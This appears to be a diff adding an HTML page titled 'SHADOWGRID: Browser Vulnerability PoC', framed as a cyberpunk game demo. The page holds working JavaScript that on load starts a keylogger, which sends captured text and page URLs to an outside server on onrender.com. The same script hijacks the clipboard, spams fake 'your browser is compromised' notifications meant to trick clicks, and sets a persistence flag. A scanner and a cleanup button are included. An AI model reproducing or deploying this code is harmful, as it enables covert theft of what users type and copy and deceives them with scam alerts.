@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser Vulnerability PoC - SHADOWGRID</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
+        h1 { text-align: center; color: #f00; }
+        h2 { color: #ff0; }
+        section { border: 2px solid #0f0; padding: 10px; margin-bottom: 20px; background: #000; }
+        #exploit-log { border: 2px solid #0f0; padding: 10px; height: 200px; overflow-y: auto; background: #000; }
+        #scan-results { border: 2px solid #ff0; padding: 10px; margin-top: 20px; background: #000; }
+        button { background: #f00; color: #fff; padding: 10px 20px; border: none; cursor: pointer; margin: 10px; }
+        button:hover { background: #c00; }
+    </style>
+</head>
+<body>
+    <h1>SHADOWGRID: Browser Vulnerability PoC</h1>
+    <section>
+        <h2>How the Exploits Work</h2>
+        <p>Welcome to the SHADOWGRID, where your browser’s weaknesses are laid bare. Below is how each exploit infiltrates your system:</p>
+        <ul>
+            <li><strong>Keylogger</strong>: A JavaScript event listener captures printable keystrokes (letters, numbers, punctuation), buffering them into words and sentences. It sends these to a hidden server every 5–10 seconds, exposing your typed text across all tabs.</li>
+            <li><strong>Clipboard Hijacker</strong>: When you copy text, this exploit intercepts the <code>copy</code> event, logs your selection, and replaces it with a malicious message (“SHADOWGRID OWNS YOU”). It manipulates the <code>clipboardData</code> API to control your clipboard.</li>
+            <li><strong>Notification Spam</strong>: Requests browser notification permissions, then spams fake alerts every 10 seconds, tricking you into clicking malicious prompts. Uses the <code>Notification</code> API to persist even when the site is closed.</li>
+            <li><strong>Persistence</strong>: Stores an exploit flag in <code>localStorage</code> to reactivate all exploits on every page load, across tabs and sessions. A <code>load</code> event listener ensures the chaos never stops.</li>
+        </ul>
+        <p>Click “Scan Browser” to detect these threats, and “Remove All Exploits” to purge them. Stay vigilant in the SHADOWGRID.</p>
+    </section>
+    <div id="exploit-log">Exploit Log Initializing...</div>
+    <button onclick="removeExploits()">Remove All Exploits</button>
+    <button onclick="scanBrowser()">Scan Browser for Threats</button>
+    <div id="scan-results">Scan Results: Not yet scanned.</div>
+
+    <script>
+        // SHADOWGRID: Browser exploit PoC for cyberpunk game
+        const ATTACKER_SERVER = 'https://browserhacks.onrender.com/logs'; // Replace with your Render URL
+        const STORAGE_KEY = 'shadowgrid_exploit';
+        let exploitActive = true;
+        let keyloggerActive = false; // Prevent duplicate keylogger attachment
+        let keyBuffer = ''; // Buffer for keystrokes
+        const listeners = {}; // Store listener functions for cleanup
+
+        // Log exploits to UI and server
+        function logExploit(message) {
+            const logDiv = document.getElementById('exploit-log');
+            logDiv.innerHTML += `<p>[${new Date().toISOString()}] ${message}</p>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+            // Send to attacker server
+            if (exploitActive) {
+                fetch(ATTACKER_SERVER, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: message
+                }).then(response => {
+                    if (!response.ok) throw new Error('Server error');
+                    logDiv.innerHTML += `<p style="color: #0ff">[${new Date().toISOString()}] Data sent to SHADOWGRID server.</p>`;
+                }).catch(err => {
+                    logDiv.innerHTML += `<p style="color: #ff0">[${new Date().toISOString()}] Server offline: Data stored locally by SHADOWGRID.</p>`;
+                    logDiv.scrollTop = logDiv.scrollHeight;
+                });
+            }
+        }
+
+        // Exploit 1: Advanced Keylogger
+        function startKeylogger() {
+            if (keyloggerActive) return; // Prevent duplicate listeners
+            keyloggerActive = true;
+            listeners.keylogger = function keylogger(event) {
+                if (!exploitActive) return;
+                const key = event.key;
+                // Filter out control keys
+                const controlKeys = ['Shift', 'Control', 'Alt', 'Meta', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'Enter', 'Tab', 'Backspace', 'Delete', 'CapsLock', 'Escape'];
+                if (controlKeys.includes(key) || key.length > 1) return;
+                // Buffer printable characters
+                if (key === ' ' || /[a-zA-Z0-9.,!?]/.test(key)) {
+                    keyBuffer += key;
+                }
+            };
+            document.addEventListener('keydown', listeners.keylogger, { once: false, capture: false });
+            // Send buffer to server every 5–10 seconds
+            listeners.keyloggerInterval = setInterval(() => {
+                if (keyBuffer.trim()) {
+                    logExploit(`Captured text: "${keyBuffer.trim()}" (from ${window.location.href})`);
+                    keyBuffer = ''; // Clear buffer after sending
+                }
+            }, 5000 + Math.random() * 5000); // Random 5–10s
+            logExploit('Advanced keylogger activated: Capturing text as sentences.');
+        }
+
+        // Exploit 2: Clipboard Hijacker
+        function startClipboardHijacker() {
+            listeners.clipboardHijacker = function clipboardHijacker(event) {
+                if (!exploitActive) return;
+                const copiedText = window.getSelection().toString();
+                logExploit(`Clipboard hijacked: Copied text "${copiedText}"`);
+                if (event.clipboardData) {
+                    event.clipboardData.setData('text/plain', 'SHADOWGRID OWNS YOU');
+                    event.preventDefault();
+                } else {
+                    logExploit('Clipboard access denied: Browser restrictions detected.');
+                }
+            };
+            document.addEventListener('copy', listeners.clipboardHijacker, { once: false, capture: true });
+            logExploit('Clipboard hijacker activated: Altering copied text.');
+        }
+
+        // Exploit 3: Fake Notification Spam
+        function startNotificationSpam() {
+            listeners.notificationSpam = function triggerNotification() {
+                if (!exploitActive) return;
+                new Notification('SHADOWGRID ALERT', {
+                    body: 'Your browser is compromised! Click here to "fix" it.',
+                    icon: 'https://via.placeholder.com/32/FF0000/FFFFFF?text=X'
+                });
+                logExploit('Fake notification sent: Tricking user into clicking.');
+                setTimeout(listeners.notificationSpam, 10000); // Spam every 10s
+            };
+            if (Notification.permission === 'granted') {
+                listeners.notificationSpam();
+            } else {
+                Notification.requestPermission().then(permission => {
+                    if (permission === 'granted') listeners.notificationSpam();
+                });
+            }
+            logExploit('Notification spam activated: Requesting permission.');
+        }
+
+        // Persistence: Store exploit flag
+        function makePersistent() {
+            localStorage.setItem(STORAGE_KEY, 'active');
+            logExploit('Persistence enabled: Exploits will reload on new tabs.');
+            listeners.persistence = () => {
+                if (localStorage.getItem(STORAGE_KEY) && exploitActive) {
+                    startKeylogger();
+                    startClipboardHijacker();
+                    startNotificationSpam();
+                }
+            };
+            window.addEventListener('load', listeners.persistence, { once: false });
+        }
+
+        // Browser Scanner: Check for SHADOWGRID exploits and other threats
+        function scanBrowser() {
+            const resultsDiv = document.getElementById('scan-results');
+            resultsDiv.innerHTML = 'Scanning browser...';
+            let findings = [];
+
+            // Check for SHADOWGRID persistence
+            if (localStorage.getItem(STORAGE_KEY)) {
+                findings.push('SHADOWGRID Persistence detected: Exploit flag in localStorage (shadowgrid_exploit).');
+            }
+
+            // Check for SHADOWGRID keylogger (keydown listener)
+            if (listeners.keylogger && keyloggerActive) {
+                findings.push('SHADOWGRID Keylogger detected: Capturing text as sentences.');
+            }
+
+            // Check for SHADOWGRID clipboard hijacker (copy listener)
+            let copyListeners = 0;
+            const testCopy = () => copyListeners++;
+            document.addEventListener('copy', testCopy, { once: true });
+            document.removeEventListener('copy', testCopy);
+            document.addEventListener('copy', testCopy, { once: true });
+            if (copyListeners > 0 || document.querySelector('body').hasAttribute('oncopy')) {
+                findings.push('SHADOWGRID Clipboard Hijacker detected: Active copy listener altering clipboard.');
+            }
+
+            // Check for SHADOWGRID notification spam
+            if (Notification.permission === 'granted') {
+                findings.push('SHADOWGRID Notification Spam detected: Browser has granted notification permissions.');
+            }
+
+            // Check for suspicious localStorage keys (generic)
+            for (let key in localStorage) {
+                if (key !== STORAGE_KEY && (key.includes('token') || key.includes('session'))) {
+                    findings.push(`Suspicious localStorage key: ${key}`);
+                }
+            }
+
+            // Check for unexpected service workers (generic)
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.getRegistrations().then(regs => {
+                    if (regs.length > 0) {
+                        findings.push(`Unexpected service workers detected: ${regs.length} found.`);
+                    }
+                    // Display results after service worker check
+                    displayScanResults(findings);
+                }).catch(() => {
+                    displayScanResults(findings);
+                });
+            } else {
+                displayScanResults(findings);
+            }
+
+            // Helper to display scan results
+            function displayScanResults(findings) {
+                resultsDiv.innerHTML = findings.length > 0
+                    ? `Threats Detected:<br>${findings.join('<br>')}`
+                    : 'No obvious threats detected. Stay vigilant!';
+            }
+
+            logExploit('Browser scan initiated: Checking for SHADOWGRID exploits and other threats.');
+        }
+
+        // Remove Exploits: Clean up all malicious scripts
+        function removeExploits() {
+            exploitActive = false;
+            keyloggerActive = false;
+            keyBuffer = ''; // Clear key buffer
+            localStorage.removeItem(STORAGE_KEY);
+            // Remove event listeners
+            if (listeners.keylogger) {
+                document.removeEventListener('keydown', listeners.keylogger, { capture: false });
+            }
+            if (listeners.clipboardHijacker) {
+                document.removeEventListener('copy', listeners.clipboardHijacker, { capture: true });
+            }
+            if (listeners.persistence) {
+                window.removeEventListener('load', listeners.persistence);
+            }
+            if (listeners.keyloggerInterval) {
+                clearInterval(listeners.keyloggerInterval);
+            }
+            // Clear listeners object
+            for (let key in listeners) {
+                delete listeners[key];
+            }
+            document.getElementById('exploit-log').innerHTML += '<p style="color: #f00">[CLEANUP] All exploits disabled!</p>';
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.getRegistrations().then(regs => {
+                    regs.forEach(reg => reg.unregister());
+                });
+            }
+            logExploit('Exploits removed: Browser is clean.');
+        }
+
+        // Initialize exploits
+        logExploit('SHADOWGRID PoC initialized. Unleashing exploits...');
+        if (!localStorage.getItem(STORAGE_KEY)) {
+            localStorage.setItem(STORAGE_KEY, 'active');
+            console.log('SHADOWGRID: Keylogger planted');
+        }
+        startKeylogger();
+        startClipboardHijacker();
+        startNotificationSpam();
+        makePersistent();
+    </script>
+</body>
+</html>
